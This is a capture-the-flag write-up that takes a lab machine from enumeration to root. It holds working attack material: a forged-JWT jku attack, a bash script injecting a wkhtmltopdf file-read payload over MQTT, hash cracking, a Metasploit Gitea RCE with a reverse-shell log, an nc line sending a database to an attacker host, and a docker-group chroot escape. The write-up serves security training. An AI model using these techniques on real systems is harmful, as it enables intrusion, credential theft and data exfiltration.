# The Thick Of It (P2P 2026)

This is the writeup of the Thick Of It fullpwn machine for the Pwn2Play 2026 CTF.

This box is fairly tricky with some novel technologies being used within it, however there is only one real attack path which should reduce play time by removing the potential for any rabbit holes.

# Initial Enumeration

```
kali@kali:~/p/thickofit►sudo nmap -sVC 10.113.170.76 -oA scan                                                    14:12
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-31 14:12 BST
Nmap scan report for 10.113.170.76
Host is up (0.069s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u9 (protocol 2.0)
| ssh-hostkey: 
|   256 34:ef:8e:52:70:19:7c:69:72:47:d9:36:88:26:35:ca (ECDSA)
|_  256 74:a7:b5:26:85:be:2d:28:d2:0a:e2:59:65:0f:3c:7d (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://dosac.p2p/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.41 seconds
```

The intial nmap scan reveals port 22 and port 80 are open, a full port scan is also a good step to perform at this time.

```
sudo nmap -p0- 10.113.170.76 -T5 -oA allportsscan                                     14:33
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-31 14:33 BST
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.08% done
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 2.38% done; ETC: 14:35 (0:02:03 remaining)
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 4.23% done; ETC: 14:35 (0:01:30 remaining)
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 4.56% done; ETC: 14:35 (0:01:45 remaining)
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 4.82% done; ETC: 14:35 (0:01:39 remaining)
Warning: 10.113.170.76 giving up on port because retransmission cap hit (2).
Nmap scan report for dosac.p2p (10.113.170.76)
Host is up (0.061s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1883/tcp open  mqtt
```

While the scan is running, it's also good to look at the website itself.

# Port 80 analysis

Attempting to visit the site causes the website to hang due to an attempted redirect to the domain http://dosac.p2p, this was also revealed in the initial nmap scan.

To fix this, dosac.p2p needs to be added to the hosts file on the system.

```
sudo vim /etc/hosts

10.113.170.76	dosac.p2p
```

Attempting to access this domain now reveals the website:

![dosac website](image.png)

Navigating around the website reveals a registration page that is not implemented as seen below:

![registration page with a disabled functionality](image-1.png)

Attempting to click the admin link or the docs link in the URL bar redirected to the login page. 

Looking at the blog page reveals 2 blog posts:

![Two blog posts](image-3.png)

Looking at the blog posts reveals an interesting observation within the URL bar of the web page. The blog posts are identified by a number which appears to be incremental:

![alt text](image-4.png)

![alt text](image-5.png)

The first post has an id of 3 and the second and id of 5, implying there is likely a 4 and a 1 and 2 at the very least. Changing these numbers allows us to see the posts even though they are not listed. This is a very basic IDOR vulnerability.

Blog ID 2 reveals a staff notice informing that the availability of report generation can be tested via the admin panel but not generating them. 

![alt text](image-6.png)

Blog ID 4 reveals another notice informing users to use mosquitto credentials to directly interface with the system to generate reports. This matches up with the open Mosquitto port we saw in the all ports nmap scan.

![alt text](image-7.png)

Blog ID 6 reveals oliver's notes that include his login credentials for the website:

![alt text](image-8.png)

This page is also useful as it informs us that login usernames to the box itself is just the users first name, no surname.

# oliver_reeder's Account

Clicking on the "admin" page still does not reveal anything, nor does clicking on the "docs" page. However, we now have a cookie called session_token:

```
eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODAwMC8ud2VsbC1rbm93bi9qd2tzLmpzb24iLCJraWQiOiJrZXktMSIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im9saXZlcl9yZWVkZXIiLCJyb2xlIjoidXNlciIsIm1xdHRfaXAiOiIxMC4xMTMuMTcwLjc2IiwibXF0dF9wb3J0IjoxODgzfQ.Xq-vIGaxwpOI8g1hvaE7G3Eb_yzelsWoCJUgtXU1lMxighnQO11kRkA1ym8yFMG_2YnOONIOR35b2DT-32_LsBlWPc1WXBMkYi7bxbKXpLmQOOMQ7zjahOoQMOVqsRpOFl77adWiN5F88H8iNKc1ZQZid0QMu5oWHrq-_XjZp4ftM6vQBFDVooFqSGu0G1MskXYJiqsKssZu2itycToLmpWvJMyWpHcv-e_USE_dkQPmb-AfgzQDvHtBGkTYVjW5QnhTKro9IU5UfXem3RrAaVuDraOhr5owJx6a0_y6w3Z14pyiFilq5AvE2bgr2jUhA9f5cc99OP8aexbYy0b5Gw
```

Base64 decoding this cookie reveals a JWT with an interesting header set. 

![alt text](image-10.png)

The headers are as follows:
```json
{"alg":"RS256","jku":"http://localhost:8000/.well-known/jwks.json","kid":"key-1","typ":"JWT"}
```

The jku header is set which sets a location for the public key used to verify the signature of the JWT. Accessing this location on the web app reveals the jwks.json file with the public key inside of it.

```json
{
  "keys": [
    {
      "e": "AQAB",
      "key_ops": [
        "verify"
      ],
      "kid": "key-1",
      "kty": "RSA",
      "n": "t-uAxuGgRxF902KXVdNAJIxIkHfQtoWPgriyrza2taXqk2n_6cYNYED8lHHV6d3bWFIscaESqTmk5PobUnXGqHd2oLQRiqSdFaojpSPF9_LJDmiOKPdJobNy0RQsBUvWNrBAAOVSpAZMlI_uRzTSOlGvCFsZvfhsZext1E7E2OIbBq5aJJgRXAGvs3wCHBI2XnlyKxh3AgCqbaeIGIqhp3UFNFUjboGXuNk8Fn8cp2fqQpBlcXSPwbA_Iq6DI445J0aZHmc7Cko6ul0lFjLViGMWGx_7dfGMSYED2XPNacd790HKcDJ7a-lD33wPRbTavPPt2dcC7dSR2QrmbeREaQ"
    }
  ]
}
```

Now the question is, what happens if we modify the cookie to contain a JKU header that points to something we control? Let's try it!

I have modified the token to have a JKU pointing to my attacker IP address which gives the following cookie:

(Note I have done these modifcations using Burp Suite Pro, this should work though if you manually edit it in another tool including Burp CE or CyberChef)
```
eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODAwMC8ud2VsbC1rbm93bi9qd2tzLmpzb24iLCJraWQiOiJrZXktMSIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im9saXZlcl9yZWVkZXIiLCJyb2xlIjoidXNlciIsIm1xdHRfaXAiOiIxMC4xMTMuMTcwLjc2IiwibXF0dF9wb3J0IjoxODgzfQ.Xq-vIGaxwpOI8g1hvaE7G3Eb_yzelsWoCJUgtXU1lMxighnQO11kRkA1ym8yFMG_2YnOONIOR35b2DT-32_LsBlWPc1WXBMkYi7bxbKXpLmQOOMQ7zjahOoQMOVqsRpOFl77adWiN5F88H8iNKc1ZQZid0QMu5oWHrq-_XjZp4ftM6vQBFDVooFqSGu0G1MskXYJiqsKssZu2itycToLmpWvJMyWpHcv-e_USE_dkQPmb-AfgzQDvHtBGkTYVjW5QnhTKro9IU5UfXem3RrAaVuDraOhr5owJx6a0_y6w3Z14pyiFilq5AvE2bgr2jUhA9f5cc99OP8aexbYy0b5Gw
```
I also modified the actual content to force a validation of the cookie, I changed the role to admin as that would be the end goal!

I then span up a HTTP server and watched what happens:

```
python3 -m http.server 8000                                                     119.645s 14:41
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.113.170.76 - - [31/May/2026 14:48:19] code 404, message File not found
10.113.170.76 - - [31/May/2026 14:48:19] "GET /.well-known/jwks.json HTTP/1.1" 404 -
```

In addition, a broken site page pops up when attempting to access the admin panel using this modified token:

![alt text](image-11.png)

Now we know the site is respecting our modified jku header, we can provide our own JWKS file!

I am using Burp to generate the new signing keys using the JWT Editor extension just because it's easier.

![alt text](image-12.png)

You can then grab the JWK from burp by right clicking and clicking "Copy Public Key as JWK" (Note: in the jwks.json on the site there is a keys array within the object, make sure your jwks.json looks like this as well)

![alt text](image-16.png)

Now, if you're using Burp, you can go back to your JWT and sign it using the newly generated key pair:

![alt text](image-14.png)

The JWT I have now generated looks like this:

```
eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly8xOTIuMTY4LjI0OC4xMTU6ODAwMC8ud2VsbC1rbm93bi9qd2tzLmpzb24iLCJraWQiOiJrZXktMSIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwibXF0dF9pcCI6IjEwLjExMy4xNzAuNzYiLCJtcXR0X3BvcnQiOjE4ODN9.Xq-vIGaxwpOI8g1hvaE7G3Eb_yzelsWoCJUgtXU1lMxighnQO11kRkA1ym8yFMG_2YnOONIOR35b2DT-32_LsBlWPc1WXBMkYi7bxbKXpLmQOOMQ7zjahOoQMOVqsRpOFl77adWiN5F88H8iNKc1ZQZid0QMu5oWHrq-_XjZp4ftM6vQBFDVooFqSGu0G1MskXYJiqsKssZu2itycToLmpWvJMyWpHcv-e_USE_dkQPmb-AfgzQDvHtBGkTYVjW5QnhTKro9IU5UfXem3RrAaVuDraOhr5owJx6a0_y6w3Z14pyiFilq5AvE2bgr2jUhA9f5cc99OP8aexbYy0b5Gw
```

Adding this to the session_token cookie and then attempting to access the admin page now works!

![alt text](image-15.png)

# Admin Panel

Now we're on the admin panel, we have two options: Test mosquitto connection and manage posts. The manage posts feature doesn't appear to be implemented so lets focus on the other. If you look back to the JWT token, there was a field that has an MQTT IP value. Changing this value to our attacker IP and then clicking the test connection button coerces the server to send a MQTT request to the attacker which reveals the username and password for the MQTT service!

```
kali@kali:~/p/thickofit►nc -lvnp 1883                                                                                                                  
listening on [any] 1883 ...
```

![alt text](image-17.png)

If you want to have a better look at this, you can use wireshark to listen to connections while listening on netcat:

![alt text](image-18.png)

We now have credentials for MQTT, `reporter:m0squ1tto0##123`

Note: At this point my target expired on THM so from here on the target IP will have changed to 10.114.151.66


# Mosquitto

The "docs" page reveals all the topics within MQTT. This section is quite long so i'm going to summarise the process you would take to discover the vuln and then give an auto solve script.

![alt text](image-19.png)

1) Add some data to a report
2) Generate a report
3) Download the report
4) View the downloaded PDFs metadata
5) Identify that wkhtmltopdf is in use
6) Research wkhtmltopdf and discover the File Disclosure vulnerability
7) Craft a payload to submit as data to retrieve a local file
8) Submit payload
9) Generate report
10) Download report
11) You have leaked a file

The below script automates this process, just modify the file name and run it!

```sh
#!/usr/bin/env bash
# report_tool.sh
#
# Automate adding data, generating, and downloading reports over MQTT
 
# ---- CONFIG ----
BROKER_HOST="<TARGET_IP>"
BROKER_PORT="1883"
MQTT_USER="${MQTT_USER:-reporter}"  # Uses environment variable if set, fallback "reporter"
MQTT_PASS="${MQTT_PASS:-m0squ1tt0##123}"
 
# ---- INPUT ----
REPORT_ID="${1:-001}"
REPORT_NAME="${2:-StudentReport}"
OUTPUT_FILE="${3:-${REPORT_NAME}.pdf}"
 
# ---- FUNCTIONS ----
 
function add_data() {
  echo "[*] Adding sample data for report $REPORT_ID"
  mosquitto_pub -h "$BROKER_HOST" -p "$BROKER_PORT" \
    -t "reports/data" \
    -m "{\"report_id\": \"$REPORT_ID\", \"field\": \"Name\", \"value\": \"Bob\"}" \
    -u "$MQTT_USER" -P "$MQTT_PASS"
 
  mosquitto_pub -h "$BROKER_HOST" -p "$BROKER_PORT" \
    -t "reports/data" \
    -m "{\"report_id\": \"$REPORT_ID\", \"field\": \"Name\", \"value\": \"<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open('GET','file:///sys/fs/cgroup/system.slice');x.send();</script>\"}" \
    -u "$MQTT_USER" -P "$MQTT_PASS"
 
}
 
function generate_report() {
  echo "[*] Requesting PDF generation for $REPORT_NAME"
  mosquitto_pub -h "$BROKER_HOST" -p "$BROKER_PORT" \
    -t "reports/generate" \
    -m "{\"report_id\": \"$REPORT_ID\", \"report_name\": \"$REPORT_NAME\"}" \
    -u "$MQTT_USER" -P "$MQTT_PASS"
 
  echo "[*] Waiting 3s for PDF to be generated..."
  sleep 3
}
 
function download_report() {
  echo "[*] Downloading PDF report $REPORT_NAME"
 
  # Start subscriber in background and redirect output
  mosquitto_sub -h "$BROKER_HOST" -p "$BROKER_PORT" \
    -t "reports/download/$REPORT_NAME" \
    -C 1 -u "$MQTT_USER" -P "$MQTT_PASS" | base64 --decode > "$OUTPUT_FILE" &
 
  SUB_PID=$!
 
  # Publish download request AFTER subscriber is ready
  sleep 0.5
  mosquitto_pub -h "$BROKER_HOST" -p "$BROKER_PORT" \
    -t "reports/download" \
    -m "{\"report_name\": \"$REPORT_NAME\"}" \
    -u "$MQTT_USER" -P "$MQTT_PASS"
 
  wait $SUB_PID
  echo "[+] PDF saved to $OUTPUT_FILE"
}
# ---- MAIN ----
add_data
generate_report
download_report
```

There are clues throughout files to find the database file of the website, this is your target.

The database is located at /var/www/app/database/app.db. This can be traced back a few different ways, one of which is guessing the systemd service file name as app.service based on common systemd service names. 

Now you have this database you can crack passwords stored within it. You can find out the password algorithm by using something like name-that-hash, hashcat auto discover, John, or reading the python file that does the hashing from the server to get the exact algorithm.

Once you have cracked the hash, you can use this to ssh as nicola into the box:

```
ssh nicola@dosac.p2p                                                                                                            15:23
The authenticity of host 'dosac.p2p (10.114.151.66)' can't be established.
ED25519 key fingerprint is SHA256:svM1Cnmha5UPK08v18aes3qwJqFV9lblsHAeW4QcR1o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'dosac.p2p' (ED25519) to the list of known hosts.
nicola@dosac.p2p's password: 
Linux vbox 6.1.0-15-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.66-1 (2023-12-09) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun May  3 19:30:54 2026 from 10.0.2.15
```

This gives you the user.txt flag

# Privesc

If you use a recent kernel exploit like copyfail or dirtyfrag, you're cheating!

The idea here is to notice that there is a port opened internally but not externally.

![alt text](image-20.png)

Port forwarding this port reveals a local instance of Gitea running on the system:

```sh
ssh -L 3000:localhost:3000 nicola@dosac.p2p  
```

![alt text](image-21.png)

The important bit to notice here is the version of Gitea running, this version is vulnerable to a remote code execution exploit https://www.exploit-db.com/exploits/51009

This exploit has a metasploit module so lets use that

![alt text](image-22.png)

In the options it can be seen that an account is required, account creation is enabled on the site so lets make one!

Once an account has been made, set the settings to match your attack setup

```
msf exploit(multi/http/gitea_git_fetch_rce) > set password test123
password => test123
msf exploit(multi/http/gitea_git_fetch_rce) > set username test
username => test
msf exploit(multi/http/gitea_git_fetch_rce) > set lhost 192.168.248.115
lhost => 192.168.248.115
msf exploit(multi/http/gitea_git_fetch_rce) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf exploit(multi/http/gitea_git_fetch_rce) > set rport 8000
rport => 8000
msf exploit(multi/http/gitea_git_fetch_rce) > set rport 3000
rport => 3000
msf exploit(multi/http/gitea_git_fetch_rce) > set srvport 9001
srvport => 9001
```
(Note I set the srvport because I had burp suite open and the default for srvport is the same as burp proxy's default port. I also swapped the shell to linux/x64/shell/reverse_tcp as I found it to work slightly better)

Running the exploit gives a shell!

```[*] Started reverse TCP handler on 192.168.248.115:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version detected: 1.16.6
[*] Using URL: http://192.168.248.115:9001/
[*] Using URL: http://192.168.248.115:9001/6CI4gnkkf3X5J6Q
[*] Command Stager progress - 100.00% done (123/123 bytes)
[*] Client 10.114.151.66 (curl/7.79.1) requested /6CI4gnkkf3X5J6Q
[*] Sending payload to 10.114.151.66 (curl/7.79.1)
[*] Sending stage (38 bytes) to 10.114.151.66
[*] Command shell session 2 opened (192.168.248.115:4444 -> 10.114.151.66:35602) at 2026-05-31 15:33:31 +0100

pwd
/data/git/repositories/test/uv1xhe6.git
whoami
git
```

# Docker escape

Initial enumeration will reveal that you are in a docker container running as the user "git". It also appears the container has been configured correctly and has no ways of privescing. So it looks like we need to look through gitea.

![alt text](image-23.png)

There is a gitea database file, lets download it to our system:

```sh
# On attacker machine
nc -lvnp 9005 > gitea.db

# On docker container

nc <attacker-ip> 9005 < gitea.db
```

Give it a minute for all the data to send, then verify using md5sum to ensure that the whole file has sent correctly

The hash should be 867bc88bcf4dd93566fded44b7d0e420

## Malcom Tucker

Analysing the Gitea DB reveals that Malcom has an account on the Gitea. Lets try and crack his password.

The algorithm is specified as pbkdf2 so now we know what to specify, but how do we get the hashes out? Well there's a tool for that!

If you're on kali there is giteatohashcat installed with hashcat, if you're not then you can find it fairly easily in the hashcat repo on github, on kali it is located at /usr/share/hashcat/tools/gitea2hashcat.py 

This tool converts the output from a sqlite query to a hashcat friendly hash as so:

```
kali@kali:~/p/thickofit►sqlite3 gitea.db                                                                         15:43
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> select email,salt,passwd,passwd_hash_algo from user;
nicola@dosac.gov.uk|dbd90e19eb4bb3771a2e7d0a0b08355b|dc0397957913e650ed039dd06952249936b15240192f7de4131a66f7f838ad86eaf6538869646219112a017268f57eb8a1b7|pbkdf2
malcom@dosac.gov.uk|5ae018b4a4fd57960ae276164e0218d4|790cddeb7e98159b1d942c2555e45a53ee8e3a7c3d20ae3b179f96ccb0f5c0e6e04f98e049c835c44528020307ad312cae6d|pbkdf2
test@test.com|d624cfd7d633eac8dbef0c6d820a396a|b685a5a411910fc82092a4456c61c5905ce83bdd9763fd13ffc853b263ced5eb7c38b661ae5c0cd3505c9d17e0e65e288f7e|pbkdf2
```

The hashes and salt from the output of this command can be put into a hashes.txt file and converted into a hashcat friendly output.

```
# hash.txt
5ae018b4a4fd57960ae276164e0218d4|790cddeb7e98159b1d942c2555e45a53ee8e3a7c3d20ae3b179f96ccb0f5c0e6e04f98e049c835c44528020307ad312cae6d

python3 /usr/share/hashcat/tools/gitea2hashcat.py < hash.txt                     16.518s 15:48
[+] Run the output hashes through hashcat mode 10900 (PBKDF2-HMAC-SHA256)

sha256:50000:WuAYtKT9V5YK4nYWTgIY1A==:eQzd636YFZsdlCwlVeRaU+6OOnw9IK47F5+WzLD1wObgT5jgScg1xEUoAgMHrTEsrm0=
```

HOWEVER, there is a little gotcha I put in here. From the Gitea docs, the default hashing algoritm for this version of gitea is NOT the one that giteatohashcat spits out, pbkdf2_v1 is the in use algorithm here meaning the above hash needs to be slightly modified to change the number of iterations

![alt text](image-24.png)

```
sha256:10000:WuAYtKT9V5YK4nYWTgIY1A==:eQzd636YFZsdlCwlVeRaU+6OOnw9IK47F5+WzLD1wObgT5jgScg1xEUoAgMHrTEsrm0=
```

![alt text](image-25.png)

The hash has now cracked and we can ssh as malcom to the main box!

# Malcom to root

![alt text](image-26.png)

This is pretty easy, Malcom is in the docker group, docker group basically gives you root access to the machine. 

Piece of cake, simply run this command and enjoy your root! (Note: most resources online say use the alpine instance, this doesn't work here because alpine isn't on the box so you need to use an image that is on the box. This can be found by running docker images.)

```
docker run -v /:/mnt --rm -it docker.gitea.com/gitea:1.16.6 chroot /mnt /bin/sh
```
